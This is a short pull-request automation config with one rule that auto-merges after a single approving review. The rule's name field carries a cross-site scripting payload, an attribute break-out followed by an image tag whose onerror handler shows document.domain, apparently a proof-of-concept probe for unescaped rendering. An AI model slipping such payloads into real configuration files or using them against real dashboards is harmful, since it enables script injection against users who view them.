pull_request_rules:
  - name: Automatic merge on approval"><img src=x onerror=alert(document.domain)>
    conditions:
      - "#approved-reviews-by>=1"
    actions:
      merge:
        method: merge
